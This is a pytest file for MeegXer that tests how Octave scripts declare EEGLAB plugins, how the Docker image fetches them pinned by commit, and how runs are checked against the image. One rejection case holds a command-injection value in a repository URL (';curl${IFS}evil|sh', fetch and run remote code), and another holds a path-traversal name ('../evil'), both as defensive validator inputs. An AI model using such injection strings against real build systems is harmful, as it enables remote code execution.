"""EEGLAB plugins an Octave script declares (docs/OCTAVE.md; decided
2026-11-25): `% Requires:` in the help block, fetched when the image is built
(pinned by commit), listed in its label, checked before a script runs, put on
that script's path only. The runs need an image with clean_rawdata
(MEEGXER_TEST_OCTAVE_IMAGE; CI builds it with `--with clean_rawdata`)."""

from __future__ import annotations

import os
import subprocess
from pathlib import Path

import numpy as np
import pytest

from meegxer.core.batch import BatchScheduler
from meegxer.core.graph import Graph
from meegxer.core.probes import MemoryProbe
from meegxer.core.sources import SyntheticSource
from meegxer.core.stage import Stage
from meegxer.plugins import index, octave_image
from meegxer.plugins.adapter import plugin_class
from meegxer.plugins.octave_plugins import (
    CATALOG,
    EeglabPlugin,
    declared,
    from_label,
    label_text,
    named,
)
from meegxer.plugins.octave_script import (
    OctaveScriptLauncher,
    origin_of,
    script_manifest,
)
from meegxer.plugins.script import ScriptError
from meegxer.plugins.sterile import SterileError

IMAGE = os.environ.get("MEEGXER_TEST_OCTAVE_IMAGE", "")
COMMIT = "0123456789abcdef0123456789abcdef01234567"
ASR_PLUGIN = Path(__file__).resolve().parents[1] / "plugins" / "eeglab_asr"


def write(folder: Path, name: str, requires: str, body: str = "") -> Path:
    path = folder / f"{name}.m"
    path.write_text(f"function EEG = {name} (EEG)\n% Uses EEGLAB plugins.\n%\n"
                    f"{requires}\n{body or '  EEG = EEG;'}\nend\n")  # fmt: skip
    return path


def test_declared_plugins_come_from_the_help_block(tmp_path: Path) -> None:
    path = write(tmp_path, "uses", "% Requires: Clean_RawData, firfilt\n"
                 f"% Requires: zapline_plus = https://github.com/x/zapline-plus @ "
                 f"{COMMIT.upper()}")  # fmt: skip
    plugins = declared(path)
    assert [p.name for p in plugins] == ["clean_rawdata", "zapline_plus"]
    assert plugins[0] == CATALOG["clean_rawdata"]  # its pinned commit
    assert plugins[1] == EeglabPlugin(
        "zapline_plus", "https://github.com/x/zapline-plus", COMMIT
    )
    assert declared(write(tmp_path, "none", "% Nothing.")) == []
    # firfilt and ICLabel are in every image: nothing to fetch
    assert declared(write(tmp_path, "base", "% Requires: firfilt, ICLabel")) == []
    assert script_manifest(path)["name"] == "script.uses"  # still a script


@pytest.mark.parametrize(
    ("requires", "message"),
    [
        ("% Requires: nosuchplugin", "not an EEGLAB plugin MeegXer knows"),
        ("% Requires: x = https://github.com/x/x @ abc123", "not an EEGLAB plugin"),
        (f"% Requires: clean_rawdata\n% Requires: clean_rawdata = "
         f"https://github.com/me/fork @ {COMMIT}", "declared twice"),
        (f"% Requires: ../evil = https://github.com/x/x @ {COMMIT}",
         "not a plugin folder name"),
        (f"% Requires: x = https://github.com/x/x;curl${{IFS}}evil|sh @ {COMMIT}",
         "not a repository URL"),  # the build's shell never sees it
        (f"% Requires: x = http://github.com/x/x @ {COMMIT}", "not a repository URL"),
        (f"% Requires: firfilt = https://github.com/me/firfilt @ {COMMIT}",
         "in every Octave image"),
    ],
)  # fmt: skip
def test_bad_declarations_are_explained(
    tmp_path: Path, requires: str, message: str
) -> None:
    with pytest.raises(ScriptError, match=message):
        declared(write(tmp_path, "bad", requires))
    with pytest.raises(ScriptError, match="in every Octave image"):
        named("ICLabel")


def test_the_image_fetches_them_and_names_them(tmp_path: Path) -> None:
    """The recipe fetches each plugin by its full commit and the label lists
    them; the code hash (the base image) does not change with them."""
    clean = CATALOG["clean_rawdata"]
    before = octave_image.code_hash()
    folder = octave_image.context(tmp_path / "ctx", [clean])
    dockerfile = (folder / "Dockerfile").read_text()
    assert f"fetch /opt/eeglab/plugins/clean_rawdata {clean.url} {clean.commit}" in (
        dockerfile)  # fmt: skip
    assert f'org.meegxer.octave.plugins="clean_rawdata@{clean.commit}"' in dockerfile
    assert octave_image.code_hash() == before
    empty = (octave_image.context(tmp_path / "base", []) / "Dockerfile").read_text()
    assert "plugins/clean_rawdata" not in empty
    assert from_label(label_text([clean])) == {"clean_rawdata": clean.commit}
    assert from_label("<no value>") == {}


def test_added_scripts_bring_their_plugins_and_runs_check_them(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    path = write(tmp_path, "lab_clean", "% Requires: clean_rawdata")
    entry = index.add_octave_script(path)
    try:
        assert entry["eeglab_plugins"][0]["commit"] == CATALOG["clean_rawdata"].commit
        assert octave_image.scripts_plugins() == [CATALOG["clean_rawdata"]]
        origin = origin_of(path)
        assert origin["eeglab_plugins"] == {
            "clean_rawdata": CATALOG["clean_rawdata"].commit}  # fmt: skip
        launcher = OctaveScriptLauncher(str(path), image="meegxer-octave:test")
        ((header, _),) = launcher.preamble()
        assert header["plugins"] == ["clean_rawdata"]  # on its path only
        # an image without it: the run is refused with what to do
        monkeypatch.setattr(octave_image, "image_code",
                            lambda *a, **k: octave_image.code_hash())  # fmt: skip
        monkeypatch.setattr(octave_image, "image_plugins", lambda *a, **k: {})
        with pytest.raises(SterileError, match=r"lacks the EEGLAB plugin "
                                               r"clean_rawdata.*build"):  # fmt: skip
            octave_image.check_image("meegxer-octave:test", None, declared(path))
        monkeypatch.setattr(octave_image, "image_plugins", lambda *a, **k: {
            "clean_rawdata": CATALOG["clean_rawdata"].commit})  # fmt: skip
        assert octave_image.check_image("meegxer-octave:test", None, declared(path))
    finally:
        index.remove("script.lab_clean")


def test_add_registers_a_script_the_image_lacks_plugins_for(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """Windows check AE: `add --script lab_clean.m` was refused (its conformance
    run needs clean_rawdata), so `octave build` never knew to fetch it. Now it
    is added unchecked and says to build, then check (decided 2026-11-27)."""
    from meegxer.plugins import cli

    path = write(tmp_path, "lab_clean", "% Requires: clean_rawdata")
    monkeypatch.setattr(octave_image, "image_plugins", lambda *a, **k: {})

    def no_suite(*a: object, **k: object) -> None:
        raise AssertionError("the suite needs the plugin: not run yet")

    monkeypatch.setattr(cli, "run_conformance", no_suite)
    try:
        assert cli.main(["add", "--script", str(path)]) == 0
        said = capsys.readouterr().out
        assert "not checked yet" in said and "clean_rawdata" in said
        assert "meegxer-plugin octave build" in said and "check --script" in said
        assert octave_image.scripts_plugins() == [
            CATALOG["clean_rawdata"]
        ]  # built next
    finally:
        index.remove("script.lab_clean")


def test_two_scripts_asking_one_plugin_differently_are_refused(
    tmp_path: Path,
) -> None:
    """One image holds one folder per plugin: two added scripts pinning it at
    two commits make the build refuse, saying so."""
    first = write(tmp_path, "lab_a", "% Requires: clean_rawdata")
    fork = f"https://github.com/me/clean_rawdata @ {COMMIT}"
    second = write(tmp_path, "lab_b", f"% Requires: clean_rawdata = {fork}")
    index.add_octave_script(first)
    index.add_octave_script(second)
    try:
        with pytest.raises(ScriptError, match="clean_rawdata is asked for at two "
                                              "commits"):  # fmt: skip
            octave_image.scripts_plugins()
    finally:
        index.remove("script.lab_a")
        index.remove("script.lab_b")


def test_yulewalk_is_the_asr_plugins_port() -> None:
    """The image's yulewalk.m is the EEGLAB ASR plugin's tested mx_yulewalk,
    under the toolbox's name (so asr_calibrate designs its filter at any
    rate in Octave)."""
    ours = (octave_image.OCTAVE_DIR / "yulewalk.m").read_text()
    theirs = (ASR_PLUGIN / "mx_yulewalk.m").read_text()

    def body(text: str, name: str) -> str:
        return text[text.index(f"function [b, a] = {name} ") :].split("\n", 1)[1]

    assert body(ours, "yulewalk") == body(theirs, "mx_yulewalk")


# -- in the image (with clean_rawdata) ---------------------------------------------


def _has_clean_rawdata() -> bool:
    if not IMAGE:
        return False
    try:
        return "clean_rawdata" in octave_image.image_plugins(IMAGE)
    except (OSError, subprocess.SubprocessError):
        return False


needs_clean = pytest.mark.skipif(
    not _has_clean_rawdata(),
    reason="set MEEGXER_TEST_OCTAVE_IMAGE to an image built --with clean_rawdata",
)


def run(path: Path, seconds: float = 30.0, sfreq: float = 250.0) -> tuple[
        np.ndarray, np.ndarray]:  # fmt: skip
    cls = plugin_class(script_manifest(path), OctaveScriptLauncher(str(path), IMAGE),
                       origin=origin_of(path, IMAGE))  # fmt: skip
    src = {"duration": seconds, "n_channels": 4, "sfreq": sfreq}
    probe, raw = MemoryProbe(), MemoryProbe()
    graph = Graph.chain([SyntheticSource(src), Stage(cls(), {}), probe])
    try:
        BatchScheduler().run(graph)
    finally:
        graph.nodes[1].impl.processor.close()  # type: ignore[union-attr]
    BatchScheduler().run(Graph.chain([SyntheticSource(src), raw]))
    return raw.signal().data, probe.signal().data


@needs_clean
def test_a_declared_plugin_is_on_the_scripts_path_only(tmp_path: Path) -> None:
    body = "  EEG = clean_drifts (EEG, [0.25 0.75]);"
    with_it = write(tmp_path, "drifts", "% Requires: clean_rawdata", body)
    x, y = run(with_it)
    assert y.shape == x.shape and not np.allclose(x, y)  # clean_drifts ran
    without = write(tmp_path, "nodrifts", "% No plugins.", body)
    with pytest.raises(Exception, match="clean_drifts"):
        run(without)  # not on this script's path


@needs_clean
def test_asr_runs_at_a_rate_eeglab_has_no_filter_for(tmp_path: Path) -> None:
    """clean_asr at 250 Hz: asr_calibrate designs its spectral filter with
    yulewalk (MeegXer's port in the image; EEGLAB only precomputes 100, 128,
    200, 256, 300, 500 and 512 Hz)."""
    asr = write(tmp_path, "asr", "% Requires: clean_rawdata",
                "  EEG = clean_asr (EEG, 20);")  # fmt: skip
    x, y = run(asr, seconds=60.0, sfreq=250.0)
    assert y.shape == x.shape and np.all(np.isfinite(y))
